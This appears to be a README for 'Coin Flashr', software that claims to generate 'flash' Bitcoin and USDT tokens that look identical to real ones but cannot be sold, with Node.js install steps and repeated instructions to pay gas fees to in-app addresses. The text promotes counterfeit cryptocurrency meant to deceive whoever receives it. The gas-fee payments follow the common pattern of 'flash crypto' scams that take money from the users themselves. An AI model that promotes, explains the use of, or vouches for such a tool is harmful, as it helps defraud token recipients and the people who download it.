## Description

Coin Flashr is a software application that lets users perform dummy transactions with multiple variants of Bitcoin (including Bitcoin Fantom and Wrapped Bitcoin) and USDT (ERC20, BEP20, and TRC20). This software application exists solely as a proof-of-concept, and should only be used experimentally. The setup and utilization is entirely dummyproof. Flash tokens have a limited usage range, and they can not be swapped simply due to a lack of liquidity, ergo you can not sell them on cryptocurrency exchanges. That simply does not exist. What you can do, however, is transfer them between cold and hardware wallets. Flash tokens are identical to the real thing until you study the underlying code.

When you gain app access, you'll have a limited spendable quota of either bitcoin or USDT, but you'll be responsible for your gas fee for the flashing transactions. You'll find a gas address in-app and the gas topup process is simple.

## Prerequisites
This application requires [Node.js](https://nodejs.org) to run.

### Windows

Download the Node.js setup application [here](https://nodejs.org/en/download/).

### Linux

Run this code in terminal. You may need superuser privileges (sudo).

```sh
apt install nodejs
```

### Mac

Install Homebrew (if you don't have it). Open the terminal and run:

```sh
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

Once Homebrew is installed, you can install Node.js by running:

```sh
brew install node
```

## Installation

1. Clone the repository:

```sh
git clone bitcoin-flashing-software/public-release
```

2. Install necessary dependencies:

```sh
npm install && npm install electron
```

## Usage

```sh
npm start
```
Gas is required for every non-bitcoin (USDT, wBTC) flashing transaction. You are responsible for your gas fees. You'll find corresponding gas addresses for each token type.
